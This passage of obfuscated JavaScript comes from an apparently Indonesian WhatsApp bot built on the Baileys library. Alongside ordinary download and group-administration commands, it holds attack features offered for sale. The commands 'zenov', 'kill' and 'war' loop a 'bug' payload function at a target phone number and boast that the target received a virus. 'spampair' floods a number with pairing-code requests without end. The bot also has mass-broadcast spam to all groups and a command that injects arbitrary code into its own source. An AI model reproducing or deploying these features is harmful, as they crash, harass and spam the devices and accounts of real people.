                    }, {
                      header: proto.Message.InteractiveMessage.Header.fromObject({
                        title: "╭ᕗ ⌜ 𝐃𝐎𝐖𝐍𝐋𝐎𝐀𝐃 𝐌𝐄𝐍𝐔 ⌟\n> ytmp4\n> ytmp3\n> dtiktok\n> mediafire\n> playmp4\n> playmp3\n> spotify\n╰━━━☯︎\n",
                        hasMediaAttachment: true,
                        ..._0x37ae68
                      }),
                      nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                        buttons: [{
                          name: "cta_url",
                          buttonParamsJson: "{\"display_text\":\"♐︎𝐙𝐞𝐧𝐨𝐍⃝𝐨𝐂𝐨𝐮𝐧𝐭𝐞𝐫↯\",\"url\":\"https://whatsapp.com/channel/0029Vaj4X9iAInPuhzUk3v1L\",\"merchant_url\":\"https://www.google.com\"}"
                        }]
                      })
                    }, {
                      header: proto.Message.InteractiveMessage.Header.fromObject({
                        title: "╭ᕗ ⌜ 𝐆𝐑𝐎𝐔𝐏 𝐌𝐄𝐍𝐔 ⌟\n> akses\n> delakses\n> hidetag\n> tagall\n> promote\n> demote\n> antilink\n> antilink2\n> open\n> close\n> jeda\n> welcome\n> left\n> setwelcome\n> changewelcome\n> delsetwelcome\n> setleft\n> changeleft\n> delsetleft\n> delete\n> kick\n> setnamagc\n> linkgc\n> setlinkgc\n> setdesk\n╰━━━☯︎\n",
                        hasMediaAttachment: true,
                        ..._0x37ae68
                      }),
                      nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                        buttons: [{
                          name: "cta_url",
                          buttonParamsJson: "{\"display_text\":\"♐︎𝐙𝐞𝐧𝐨𝐍⃝𝐨𝐂𝐨𝐮𝐧𝐭𝐞𝐫↯\",\"url\":\"https://whatsapp.com/channel/0029Vaj4X9iAInPuhzUk3v1L\",\"merchant_url\":\"https://www.google.com\"}"
                        }]
                      })
                    }, {
                      header: proto.Message.InteractiveMessage.Header.fromObject({
                        title: "╭ᕗ ⌜ 𝐒𝐓𝐎𝐑𝐄 𝐌𝐄𝐍𝐔 ⌟\n> jpm\n> jpmfoto\n> autojpm on/off\n> cekidgc\n> idgc\n> pushkontakid\n> pushkontakgc\n> savekontak\n> donasi\n> proses\n> setproses\n> changeproses\n> delsetproses\n> done\n> setdone\n> changedone\n> delsetdone\n> tunda\n> batal\n> listpanel\n> listvps\n> addtesti\n> produklain\n> listvps\n> deltesti\n> testimoni\n╰━━━☯︎\n",
                        hasMediaAttachment: true,
                        ..._0x37ae68
                      }),
                      nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                        buttons: [{
                          name: "cta_url",
                          buttonParamsJson: "{\"display_text\":\"♐︎𝐙𝐞𝐧𝐨𝐍⃝𝐨𝐂𝐨𝐮𝐧𝐭𝐞𝐫↯\",\"url\":\"https://whatsapp.com/channel/0029Vaj4X9iAInPuhzUk3v1L\",\"merchant_url\":\"https://www.google.com\"}"
                        }]
                      })
                    }]
                  })
                })
              }
            }
          }, {
            userJid: _0x5dd2ef.sender,
            quoted: _0x5dd2ef
          });
          await _0x554af5.relayMessage(_0x5dd2ef.chat, _0x506d86.message, {
            messageId: _0x506d86.key.id
          });
          await sleep(1500);
          await _0x554af5.sendMessage(_0x5dd2ef.chat, {
            audio: _0x5cdd11,
            mimetype: "audio/mp4",
            ptt: true
          });
        }
        break;
      case "mediafire":
        {
          if (!_0x439cd6) {
            return _0x3f20c7("Ngapain ? Fitur Ini Buat Bang dray");
          }
          if (_0x1d31fd.length == 0) {
            return _0x3f20c7("Link Nya Tuan?");
          }
          if (!isUrl(_0x1d31fd[0]) && !_0x1d31fd[0].includes("mediafire.com")) {
            return _0x3f20c7("The link you provided is invalid");
          }
          const {
            mediafireDl: _0x35e8fd
          } = require("./database/mediafire.js");
          const _0x1edd4c = await _0x35e8fd(_0x2ece04);
          if (_0x1edd4c[0].size.split("MB")[0] >= 100) {
            return _0x3f20c7("Oops, the file is too big...");
          }
          const _0xbcd4fe = "*MEDIAFIRE DOWNLOADER*\n\n*❖ Name* : " + _0x1edd4c[0].nama + "\n*❖ Size* : " + _0x1edd4c[0].size + "\n*❖ Mime* : " + _0x1edd4c[0].mime + "\n*❖ Link* : " + _0x1edd4c[0].link;
          _0x3f20c7("" + _0xbcd4fe);
          _0x554af5.sendMessage(_0x5dd2ef.chat, {
            document: {
              url: _0x1edd4c[0].link
            },
            fileName: _0x1edd4c[0].nama,
            mimetype: _0x1edd4c[0].mime
          }, {
            quoted: _0x5dd2ef
          });
        }
        break;
      case "jpmfoto":
        {
          if (!_0x439cd6) {
            return _0x3f20c7(mess.only.owner);
          }
          if (!_0x2ece04) {
            return _0x3f20c7("*Penggunaan Salah Silahkan Gunakan Seperti Ini*\n" + (_0x505e97 + _0x3c8344) + " teks|jeda\n\nReply Gambar Untuk Mengirim Gambar Ke Semua Group\nUntuk Jeda Itu Delay Jadi Nominal Jeda Itu 1000 = 1 detik");
          }
          let _0x2ec836 = await _0x554af5.groupFetchAllParticipating();
          let _0x6d2d9f = Object.entries(_0x2ec836).slice(0).map(_0x37575f => _0x37575f[1]);
          let _0x19cd84 = _0x6d2d9f.map(_0x89b7f0 => _0x89b7f0.id);
          for (let _0x4535e9 of _0x19cd84) {
            if (/image/.test(_0xb4c66d)) {
              media = await _0x554af5.downloadAndSaveMediaMessage(_0x5c113a);
              mem = await uptotelegra(media);
              await _0x554af5.sendMessage(_0x4535e9, {
                image: {
                  url: mem
                },
                caption: _0x2ece04.split("|")[0]
              });
              await sleep(_0x2ece04.split("|")[1]);
            } else {
              await _0x554af5.sendMessage(_0x4535e9, {
                text: _0x2ece04.split("|")[0]
              });
              await sleep(_0x2ece04.split("|")[1]);
            }
          }
          _0x3f20c7("Sukses Mengirim Broadcast Ke " + _0x19cd84.length + " Group");
        }
        break;
      case "playmp4":
        {
          if (!_0x1db4e8 && !_0x439cd6) {
            return _0x3f20c7("lu siapa?");
          }
          if (!q) {
            return _0x3f20c7("Enter the Song Title!");
          }
          _0x3f20c7("Tunggu Kak sedang Zeno Proses");
          let _0x43ab1f = await ytPlayMp4(q);
          _0x554af5.sendMessage(_0x2f68f6, {
            video: {
              url: _0x43ab1f.url[0]
            },
            caption: "Youtube Play Video\n\nTitle: " + _0x43ab1f.title + "\nChannel: " + _0x43ab1f.channel + "\nViews: " + _0x43ab1f.views
          }, {
            quoted: _0x5dd2ef
          });
        }
        break;
      case "playmp3":
        {
          if (!_0x1db4e8 && !_0x439cd6) {
            return _0x3f20c7("lu siapa?");
          }
          if (!q) {
            return _0x3f20c7("Enter the Song Title!");
          }
          _0x3f20c7("Tunggu Kak sedang Zeno Proses");
          let _0x1204ae = await ytPlayMp3(q);
          _0x554af5.sendMessage(_0x2f68f6, {
            audio: {
              url: _0x1204ae.url[0]
            },
            mimetype: "audio/mp4",
            ptt: false
          }, {
            quoted: _0x5dd2ef
          });
        }
        break;
      case "ytmp4":
        {
          if (!_0x1db4e8 && !_0x439cd6) {
            return _0x3f20c7("lu siapa?");
          }
          if (!q) {
            return _0x3f20c7("Link Not Found !");
          }
          _0x3f20c7("Tunggu Kak sedang Zeno Proses");
          let _0x492fcc = await ytDonlodMp4(q);
          _0x554af5.sendMessage(_0x2f68f6, {
            video: {
              url: _0x492fcc.url[0]
            },
            caption: "Youtube Download Video\n\nJudul: " + _0x492fcc.title + "\nChannel: " + _0x492fcc.channel + "\nUpload: " + _0x492fcc.published + "\nViews: " + _0x492fcc.views
          }, {
            quoted: _0x5dd2ef
          });
        }
        break;
      case "ytmp3":
        {
          if (!_0x1db4e8 && !_0x439cd6) {
            return _0x3f20c7("lu siapa?");
          }
          if (!q) {
            return _0x3f20c7("Link Not Found !");
          }
          _0x3f20c7("Tunggu Kak sedang Zeno Proses");
          let _0x16964d = await ytDonlodMp3(q);
          _0x554af5.sendMessage(_0x2f68f6, {
            audio: {
              url: _0x16964d.url[0]
            },
            mimetype: "audio/mp4",
            ptt: false
          }, {
            quoted: _0x5dd2ef
          });
        }
        break;
      case "dtiktok":
        {
          if (!_0x439cd6) {
            return _0x5dd2ef.reply("*khusus Premium*");
          }
          if (!_0x2ece04) {
            return _0x5dd2ef.reply("Example : " + (_0x505e97 + _0x3c8344) + " link");
          }
          if (!q.includes("tiktok")) {
            return _0x5dd2ef.reply("Link Invalid!!");
          }
          await _0x3f20c7(mess.wait);
          require("./database/tiktok").Tiktok(q).then(_0x376ab8 => {
            _0x554af5.sendMessage(_0x5dd2ef.chat, {
              video: {
                url: _0x376ab8.nowm
              }
            }, {
              quoted: _0x5dd2ef
            });
          });
        }
        break;
      case "joingc":
        {
          if (!_0x439cd6) {
            return _0x3f20c7(mess.only.owner);
          }
          if (!q) {
            return _0x3f20c7("Kirim perintah " + (_0x505e97 + _0x3c8344) + " *_Link Grup Nya Tuan?🤔_*");
          }
          var _0x4db252 = q.split("https://chat.whatsapp.com/")[1];
          var _0x249112 = await _0x554af5.groupAcceptInvite(_0x4db252);
          _0x5dd2ef.reply("*Sukses Join Ke Grup Tuan✅*");
        }
        break;
      case "spotify":
        {
          if (!_0x2ece04) {
            return _0x3f20c7("Contoh : " + (_0x505e97 + _0x3c8344) + " dandelion");
          }
          let _0x49a241 = await fetchJson("https://api.junn4.my.id/search/spotify?query=" + _0x2ece04);
          const _0xc99952 = "乂 *S P O T I F Y*\n\n*Title*: " + _0x49a241.data[0].title + "\n*Duration*: " + _0x49a241.data[0].duration + "\n*Popular*: " + _0x49a241.data[0].popularity + "\n*Url*: " + _0x49a241.data[0].url + "\n";
          _0x554af5.sendMessage(_0x5dd2ef.chat, {
            text: _0xc99952,
            contextInfo: {
              externalAdReply: {
                title: "𝙎𝙥𝙤𝙩𝙞𝙛𝙮𝙈𝙪𝙨𝙞𝙘",
                body: "© DrayXD",
                showAdAttribution: true,
                mediaType: 1,
                sourceUrl: "",
                thumbnailUrl: "https://img100.pixhost.to/images/53/532428061_skyzopedia.jpg",
                renderLargerThumbnail: true
              }
            }
          }, {
            quoted: _0x1e3598
          });
          const _0x590d0d = await fetchJson("https://api.junn4.my.id/download/spotify?url=" + _0x49a241.data[0].url);
          const _0x18bd21 = _0x590d0d.data.download;
          _0x554af5.sendMessage(_0x5dd2ef.chat, {
            audio: {
              url: _0x18bd21
            },
            mimetype: "audio/mpeg",
            contextInfo: {
              externalAdReply: {
                title: "𝙎𝙥𝙤𝙩𝙞𝙛𝙮𝙈𝙪𝙨𝙞𝙘",
                body: "",
                thumbnailUrl: "https://img100.pixhost.to/images/53/532428061_skyzopedia.jpg",
                sourceUrl: _0x2984fd,
                mediaType: 1,
                showAdAttribution: true,
                renderLargerThumbnail: true
              }
            }
          }, {
            quoted: _0x1e3598
          });
        }
        break;
      case "delcase":
        {
          if (!_0x1e7bc9) {
            return _0x3f20c7("*Access Denied ❌*\n\n*Owners only*");
          }
          if (!q) {
            return _0x3f20c7("*Masukan nama case yang akan di hapus*");
          }
          _0x54410f("./dray1922.js", q);
          _0x3f20c7("*Dellcase Successfully*\n\n© Dellcase By Velzdev");
        }
        break;
      case "addcase":
        {
          if (!_0x439cd6) {
            return _0x3f20c7("lu sapa asu");
          }
          if (!_0x2ece04) {
            return _0x3f20c7("Mana case nya");
          }
          const _0x52a127 = require("fs");
          const _0x477615 = "drayyy1922.js";
          const _0x1ca3aa = _0x2ece04;
          _0x52a127.readFile(_0x477615, "utf8", (_0x3fa234, _0x58c5d5) => {
            if (_0x3fa234) {
              console.error("Terjadi kesalahan saat membaca file:", _0x3fa234);
              return;
            }
            const _0x179e2e = _0x58c5d5.indexOf("case 'addcase':");
            if (_0x179e2e !== -1) {
              const _0x1f6e4c = _0x58c5d5.slice(0, _0x179e2e) + "\n" + _0x1ca3aa + "\n" + _0x58c5d5.slice(_0x179e2e);
              _0x52a127.writeFile(_0x477615, _0x1f6e4c, "utf8", _0x363c71 => {
                if (_0x363c71) {
                  _0x3f20c7("Terjadi kesalahan saat menulis file:", _0x363c71);
                } else {
                  _0x3f20c7("Case baru berhasil ditambahkan.");
                }
              });
            } else {
              _0x3f20c7("Tidak dapat menambahkan case dalam file.");
            }
          });
        }
        break;
      case "zenov1":
      case "zenov2":
      case "zenov3":
      case "zenov4":
      case "zenov5":
      case "zenov6":
      case "zenov7":
        {
          if (!_0x1db4e8 && !_0x439cd6 && !_0x58d2b2) {
            return _0x3f20c7(mess.only.premium);
          }
          if (!q) {
            return _0x3f20c7("Example: " + (_0x505e97 + _0x3c8344) + " 62×××");
          }
          let _0x4aaa08 = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
          _0x3f20c7("𓊈 𝐙𝐄𝐍𝐎 𝐒𝐔𝐂𝐂𝐄𝐒 𝐁𝐔𝐆 𓊉\n\nッ 𝐒𝐓𝐀𝐓𝐔𝐒 : sᴜᴄᴄᴇssғᴜʟʟ\nッ 𝐓𝐘𝐏𝐄 𝐁𝐔𝐆  : ᴢᴇɴᴏ ʙᴜɢ\n\n   📌 𝐍𝐎𝐓𝐄\n> Target telah menerima virus bug, jika ingin membeli script hubungi dray < t.me/drayoffc >");
          for (let _0x1b2969 = 0; _0x1b2969 < 50; _0x1b2969++) {
            await _0xaadba0(_0x4aaa08, Ptcp = true);
            await sleep(2000);
            await _0xaadba0(_0x4aaa08, Ptcp = true);
            await sleep(2000);
            await _0xaadba0(_0x4aaa08, Ptcp = true);
          }
          await sleep(5000);
        }
        break;
      case "hitam":
      case "hancurkan":
      case "priz":
      case "blank":
      case "killsystem":
      case "jid":
      case "kill":
        {
          if (!_0x1db4e8 && !_0x439cd6 && !_0x58d2b2) {
            return _0x3f20c7(mess.only.premium);
          }
          if (!q) {
            return _0x3f20c7("Example: " + (_0x505e97 + _0x3c8344) + " 62×××");
          }
          let _0x3a5ef7 = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
          _0x3f20c7("𓊈 𝐙𝐄𝐍𝐎 𝐒𝐔𝐂𝐂𝐄𝐒 𝐁𝐔𝐆 𓊉\n\nッ 𝐒𝐓𝐀𝐓𝐔𝐒 : sᴜᴄᴄᴇssғᴜʟʟ\nッ 𝐓𝐘𝐏𝐄 𝐁𝐔𝐆  : ʙᴜɢ ᴜɪ\n\n   📌 𝐍𝐎𝐓𝐄\n> Target telah menerima virus bug, jika ingin membeli script hubungi dray < t.me/drayoffc >");
          for (let _0xeed6da = 0; _0xeed6da < 50; _0xeed6da++) {
            await _0xaadba0(_0x3a5ef7, Ptcp = true);
            await sleep(2000);
            await _0xaadba0(_0x3a5ef7, Ptcp = true);
            await sleep(2000);
            await _0xaadba0(_0x3a5ef7, Ptcp = true);
          }
          await sleep(5000);
        }
        break;
      case "war1":
      case "war2":
      case "war3":
      case "war4":
      case "war5":
      case "war":
      case "war":
        {
          if (!_0x1db4e8 && !_0x439cd6 && !_0x58d2b2) {
            return _0x3f20c7(mess.only.premium);
          }
          if (!q) {
            return _0x3f20c7("Example: " + (_0x505e97 + _0x3c8344) + " 62×××");
          }
          let _0x3c2ab8 = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
          _0x3f20c7("𓊈 𝐙𝐄𝐍𝐎 𝐒𝐔𝐂𝐂𝐄𝐒 𝐁𝐔𝐆 𓊉\n\nッ 𝐒𝐓𝐀𝐓𝐔𝐒 : sᴜᴄᴄᴇssғᴜʟʟ\nッ 𝐓𝐘𝐏𝐄 𝐁𝐔𝐆  : ᴡᴀʀ ʙᴜɢ\n\n   📌 𝐍𝐎𝐓𝐄\n> Target telah menerima virus bug, jika ingin membeli script hubungi dray < t.me/drayoffc >");
          for (let _0x210b90 = 0; _0x210b90 < 50; _0x210b90++) {
            await _0xaadba0(_0x3c2ab8, Ptcp = true);
            await sleep(2000);
            await _0xaadba0(_0x3c2ab8, Ptcp = true);
            await sleep(2000);
            await _0xaadba0(_0x3c2ab8, Ptcp = true);
          }
          await sleep(5000);
        }
        break;
      case "spampair":
        {
          if (!_0x1db4e8 && !_0x439cd6) {
            return _0x3f20c7("Fitur ini hanya untuk pengguna Premium.");
          }
          if (!q) {
            return _0x3f20c7("Contoh: " + (_0x505e97 + _0x3c8344) + " 62xxxxx");
          }
          await _0x554af5.sendMessage(_0x5dd2ef.chat, {
            react: {
              text: "✅",
              key: _0x5dd2ef.key
            }
          });
          let _0x252fb3 = q.replace(/[^0-9]/g, "").trim();
          let {
            default: _0x44f3fa,
            useMultiFileAuthState: _0x4f3150,
            fetchLatestBaileysVersion: _0xc9cc75
          } = require("@whiskeysockets/baileys");
          let {
            state: _0x82dfa6
          } = await _0x4f3150("drayyy");
          let {
            version: _0x4141ee
          } = await _0xc9cc75();
          let _0x561065 = await _0x44f3fa({
            auth: _0x82dfa6,
            version: _0x4141ee,
            logger: pino({
              level: "fatal"
            })
          });
          while (true) {
            for (let _0x4de3a9 = 0; _0x4de3a9 < 20; _0x4de3a9++) {
              await sleep(3000);
              try {
                let _0x503e90 = await _0x561065.requestPairingCode(_0x252fb3);
                console.log("# Succes Spam Pairing Code - Number : " + _0x252fb3 + " - Code : " + _0x503e90);
                await _0x561065.sendMessage(_0x252fb3, {
                  text: "Pairing Code: " + _0x503e90
                });
              } catch (_0x2147cb) {
                console.error("Error pada request pairing code: " + _0x2147cb);
                if (_0x2147cb.message.includes("Connection Closed")) {
                  console.log("Koneksi tertutup, mencoba reconnect...");
                  break;
                }
              }
            }
            await sleep(60000);
          }
        }
        break;
      case "addseller":
        {
          if (!_0x439cd6) {
            return _0x3f20c7(mess.only.owner);
          }
          if (!_0x1d31fd[0]) {
            return _0x3f20c7("Penggunaan " + (_0x505e97 + _0x3c8344) + " nomor\nContoh " + (_0x505e97 + _0x3c8344) + " 62838072690");
          }
          prrkek = q.split("|")[0].replace(/[^0-9]/g, "") + "@s.whatsapp.net";
          let _0x570e03 = await _0x554af5.onWhatsApp(prrkek);
          if (_0x570e03.length == 0) {
            return _0x3f20c7("Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp Yah Kontol!!!");
          }
          _0x7fe93f.push(prrkek);
          fs.writeFileSync("./database/premium.json", JSON.stringify(_0x7fe93f));
          _0x3f20c7("Nomor " + prrkek + " Telah Menjadi Reseller Panel!");
        }
        break;
      case "addprem":
        {
          if (!_0x439cd6) {
            return _0x3f20c7(mess.only.owner);
          }
          if (!_0x1d31fd[0]) {
            return _0x3f20c7("Penggunaan " + (_0x505e97 + _0x3c8344) + " nomor\nContoh " + (_0x505e97 + _0x3c8344) + " 62838072690");
          }
          prrkek = q.split("|")[0].replace(/[^0-9]/g, "") + "@s.whatsapp.net";
          let _0x346fa6 = await _0x554af5.onWhatsApp(prrkek);
          if (_0x346fa6.length == 0) {
            return _0x3f20c7("Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp Yah Kontol!!!");
          }
          _0x7fe93f.push(prrkek);
          fs.writeFileSync("./database/premium.json", JSON.stringify(_0x7fe93f));
          _0x3f20c7("Nomor " + prrkek + " Telah Menjadi Premium!");
        }
        break;
      case "addmurbug":
        {
          if (!_0x439cd6) {
            return _0x3f20c7(mess.only.owner);
          }
          if (!_0x1d31fd[0]) {
            return _0x3f20c7("Penggunaan " + (_0x505e97 + _0x3c8344) + " nomor\nContoh " + (_0x505e97 + _0x3c8344) + " 62838072690");
          }
          prrkek = q.split("|")[0].replace(/[^0-9]/g, "") + "@s.whatsapp.net";
          let _0x538958 = await _0x554af5.onWhatsApp(prrkek);
          if (_0x538958.length == 0) {
            return _0x3f20c7("Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp Yah Kontol!!!");
          }
          _0x7fe93f.push(prrkek);
          fs.writeFileSync("./database/premium.json", JSON.stringify(_0x7fe93f));
          _0x3f20c7("Nomor " + prrkek + " Telah Menjadi Murbug");
        }
        break;
      case "delprem":
        {
          if (!_0x439cd6) {
            return _0x3f20c7(mess.only.owner);
          }
          if (!_0x1d31fd[0]) {
            return _0x3f20c7("Penggunaan " + (_0x505e97 + _0x3c8344) + " nomor\nContoh " + (_0x505e97 + _0x3c8344) + " 628388072690");
          }
          bro = q.split("|")[0].replace(/[^0-9]/g, "") + "@s.whatsapp.net";
          unp = _0x7fe93f.indexOf(bro);
          _0x7fe93f.splice(unp, 1);
          fs.writeFileSync("./database/premium.json", JSON.stringify(_0x7fe93f));
          _0x3f20c7("Nomor " + bro + " Telah Di Hapus Premium!");
        }
        break;
      case "delseller":
        {
          if (!_0x439cd6) {
            return _0x3f20c7(mess.only.owner);
          }
          if (!_0x1d31fd[0]) {
            return _0x3f20c7("Penggunaan " + (_0x505e97 + _0x3c8344) + " nomor\nContoh " + (_0x505e97 + _0x3c8344) + " 628388072690");
          }
          bro = q.split("|")[0].replace(/[^0-9]/g, "") + "@s.whatsapp.net";
          unp = _0x7fe93f.indexOf(bro);
          _0x7fe93f.splice(unp, 1);
          fs.writeFileSync("./database/premium.json", JSON.stringify(_0x7fe93f));
          _0x3f20c7("Nomor " + bro + " Telah Di Hapus Seller");
        }
        break;
      case "delmurbug":
        {
          if (!_0x439cd6) {
            return _0x3f20c7(mess.only.owner);
          }
          if (!_0x1d31fd[0]) {
            return _0x3f20c7("Penggunaan " + (_0x505e97 + _0x3c8344) + " nomor\nContoh " + (_0x505e97 + _0x3c8344) + " 628388072690");
          }
          bro = q.split("|")[0].replace(/[^0-9]/g, "") + "@s.whatsapp.net";
          unp = _0x7fe93f.indexOf(bro);
          _0x7fe93f.splice(unp, 1);
          fs.writeFileSync("./database/premium.json", JSON.stringify(_0x7fe93f));
          _0x3f20c7("Nomor " + bro + " Telah Di Hapus Murbug!");
        }
        break;
      case "addown":
        {
          if (!_0x439cd6) {
            return _0x3f20c7(mess.only.owner);
          }
          if (!_0x1d31fd[0]) {
            return _0x3f20c7("Penggunaan " + (_0x505e97 + _0x3c8344) + " nomor\nContoh " + (_0x505e97 + _0x3c8344) + " 62838072690");
          }
          prrkek = q.split("|")[0].replace(/[^0-9]/g, "") + "@s.whatsapp.net";
          let _0x1a7667 = await _0x554af5.onWhatsApp(prrkek);
          if (_0x1a7667.length == 0) {
            return _0x3f20c7("Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp Yah Kontol!!!");
          }
          _0x259e8b.push(prrkek);
          fs.writeFileSync("./database/owner.json", JSON.stringify(_0x259e8b));
          _0x3f20c7("Nomor " + prrkek + " Telah Menjadi Owner!");
        }
        break;
      case "delown":
        {
          if (!_0x439cd6) {
            return _0x3f20c7(mess.only.owner);
          }
          if (!_0x1d31fd[0]) {
            return _0x3f20c7("Penggunaan " + (_0x505e97 + _0x3c8344) + " nomor\nContoh " + (_0x505e97 + _0x3c8344) + " 628388072690");
          }
          bro = q.split("|")[0].replace(/[^0-9]/g, "") + "@s.whatsapp.net";
          unp = _0x259e8b.indexOf(bro);
          _0x259e8b.splice(unp, 1);
          fs.writeFileSync("./database/owner.json", JSON.stringify(_0x259e8b));
          _0x3f20c7("Nomor " + bro + " Telah Di Hapus Owner!");
        }
        break;
      case "addpt":
        {
          if (!_0x439cd6) {
            return _0x3f20c7(mess.only.owner);
          }
          if (!_0x1d31fd[0]) {
            return _0x3f20c7("Penggunaan " + (_0x505e97 + _0x3c8344) + " nomor\nContoh " + (_0x505e97 + _0x3c8344) + " 62838072690");
          }
          prrkek = q.split("|")[0].replace(/[^0-9]/g, "") + "@s.whatsapp.net";
          let _0x2289e4 = await _0x554af5.onWhatsApp(prrkek);
          if (_0x2289e4.length == 0) {
            return _0x3f20c7("Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp Yah Kontol!!!");
          }
          _0x44d549.push(prrkek);
          fs.writeFileSync("./database/partner.json", JSON.stringify(_0x44d549));
          _0x3f20c7("Nomor " + prrkek + " Telah Menjadi PT Panel!");
        }
        break;
      case "delpt":
        {
          if (!_0x439cd6) {
            return _0x3f20c7(mess.only.owner);
          }
          if (!_0x1d31fd[0]) {
            return _0x3f20c7("Penggunaan " + (_0x505e97 + _0x3c8344) + " nomor\nContoh " + (_0x505e97 + _0x3c8344) + " 628388072690");
          }
          bro = q.split("|")[0].replace(/[^0-9]/g, "") + "@s.whatsapp.net";
          unp = _0x44d549.indexOf(bro);
          _0x44d549.splice(unp, 1);
          fs.writeFileSync("./database/partner.json", JSON.stringify(_0x44d549));
          _0x3f20c7("Nomor " + bro + " Telah Di Hapus PT Panel!");
        }
        break;
      case "addgcseller":
        if (!_0x439cd6) {
          return;
        }
        if (!_0x4a73b4) {
          return _0x3f20c7("kushus grup!");
        }
        if (!_0x439cd6) {
          return _0x3f20c7(mess.only.owner);
        }
        _0x2853f7.push(_0x5dd2ef.chat);
        fs.writeFileSync("./database/unli.json", JSON.stringify(_0x2853f7));
        _0x3f20c7("Berhasil addgcseller");
        break;
      case "delgcseller":
        {
          if (!_0x4a73b4) {
            return _0x3f20c7("kushus grup!");
          }
          if (!_0x439cd6) {
            return _0x3f20c7(mess.only.owner);
          }
          _0x2853f7.splice(_0x5dd2ef.chat);
          fs.writeFileSync("./database/unli.json", JSON.stringify(_0x2853f7));
          _0x3f20c7("Berhasil Delgcseller");
        }
        break;
      case "addgcmurbug":
        if (!_0x439cd6) {
          return;
        }
        if (!_0x4a73b4) {
          return _0x3f20c7("kushus grup!");
        }
        if (!_0x439cd6) {
          return _0x3f20c7(mess.only.owner);
        }
        _0x2853f7.push(_0x5dd2ef.chat);
        fs.writeFileSync("./database/unli.json", JSON.stringify(_0x2853f7));
        _0x3f20c7("Seluruh member grup kini telah menjadi murbug");
        break;
      case "delgcmurbug":
        {
          if (!_0x4a73b4) {
            return _0x3f20c7("kushus grup!");
          }
          if (!_0x439cd6) {
            return _0x3f20c7(mess.only.owner);
          }
          _0x2853f7.splice(_0x5dd2ef.chat);
          fs.writeFileSync("./database/unli.json", JSON.stringify(_0x2853f7));
          _0x3f20c7("Seluruh member grup sudah tidak lagi menjadi murbug");
        }
        break;
      case "ramlist":
        lrm = "RAM BANG DRAY YANG TERSEDIA :\n\n.1GB nama,62xxxx\n.2GB nama,62xxxx\n.3GB nama,62xxxx\n.4GB nama,62xxxx\n.5GB nama,62xxxx\n.6GB nama,62xxxx\n.7GB nama,62xxxx\n.8GB nama,62xxxx\n.9GB nama,62xxxx\n.10GB nama,62xxxx\n.unli nama,62xxxx\n\nSelamat Berjualan :)\n";
        _0x554af5.sendMessage(_0x2f68f6, {
          text: lrm
        }, {
          quoted: _0x5dd2ef
        });
        break;
      case "listsrv":
        {
          if (!_0x439cd6 && !_0x3da684) {
            return _0x3f20c7("Maaf, Anda tidak dapat melihat daftar server cuma bang dray yang bisa.");
          }
          let _0x5f4493 = _0x1d31fd[0] ? _0x1d31fd[0] : "1";
          let _0x307720 = await fetch(domain + "/api/application/servers?page=" + _0x5f4493, {
            method: "GET",
            headers: {
              Accept: "application/json",
              "Content-Type": "application/json",
              Authorization: "Bearer " + apikey
            }
          });
          let _0x39e927 = await _0x307720.json();
          let _0x4e5e0d = _0x39e927.data;
          let _0x320a0b = [];
          let _0x366eae = "Berikut adalah daftar servernya bang dray:\n\n";
          for (let _0x594cd0 of _0x4e5e0d) {
            let _0x4f2a83 = _0x594cd0.attributes;
            let _0x45ade3 = await fetch(domain + "/api/client/servers/" + _0x4f2a83.uuid.split`-`[0] + "/resources", {
              method: "GET",
              headers: {
                Accept: "application/json",
                "Content-Type": "application/json",
                Authorization: "Bearer " + capikey
              }
            });
            let _0x1cd6a5 = await _0x45ade3.json();
            let _0x159f03 = _0x1cd6a5.attributes ? _0x1cd6a5.attributes.current_state : _0x4f2a83.status;
            _0x366eae += "ID Server: " + _0x4f2a83.id + "\n";
            _0x366eae += "Nama Server: " + _0x4f2a83.name + "\n";
            _0x366eae += "Status: " + _0x159f03 + "\n\n";
            _0x366eae += "BY dray";
          }
          _0x366eae += "Halaman: " + _0x39e927.meta.pagination.current_page + "/" + _0x39e927.meta.pagination.total_pages + "\n";
          _0x366eae += "Total Server: " + _0x39e927.meta.pagination.count;
          await _0x554af5.sendMessage(_0x5dd2ef.chat, {
            text: _0x366eae
          }, {
            quoted: _0x5dd2ef
          });
          if (_0x39e927.meta.pagination.current_page < _0x39e927.meta.pagination.total_pages) {
            _0x3f20c7("Gunakan perintah " + _0x505e97 + "listsrv " + (_0x39e927.meta.pagination.current_page + 1) + " untuk melihat halaman selanjutnya.");
          }
        }
        break;
      case "listusr":
        {
          if (!_0x439cd6 && !_0x3da684) {
            return _0x3f20c7(mess.only.premium);
          }
          let _0x3767fe = _0x1d31fd[0] ? _0x1d31fd[0] : "1";
          let _0x453169 = await fetch(domain + "/api/application/users?page=" + _0x3767fe, {
            method: "GET",
            headers: {
              Accept: "application/json",
              "Content-Type": "application/json",
              Authorization: "Bearer " + apikey
            }
          });
          let _0x3a2324 = await _0x453169.json();
          let _0x2a82a7 = _0x3a2324.data;
          let _0x401ce4 = "Berikut list usernya bang dray:\n\n";
          for (let _0x47d132 of _0x2a82a7) {
            let _0x377399 = _0x47d132.attributes;
            _0x401ce4 += "ID: " + _0x377399.id + " - Status: " + (_0x377399.attributes?.user?.server_limit === null ? "Inactive" : "Active") + "\n";
            _0x401ce4 += _0x377399.username + "\n";
            _0x401ce4 += _0x377399.first_name + " " + _0x377399.last_name + "\n\n";
            _0x401ce4 += "DrayXD";
          }
          _0x401ce4 += "Page: " + _0x3a2324.meta.pagination.current_page + "/" + _0x3a2324.meta.pagination.total_pages + "\n";
          _0x401ce4 += "Total Users: " + _0x3a2324.meta.pagination.count;
          await _0x554af5.sendMessage(_0x5dd2ef.chat, {
            text: _0x401ce4
          }, {
            quoted: _0x5dd2ef
          });
          if (_0x3a2324.meta.pagination.current_page < _0x3a2324.meta.pagination.total_pages) {
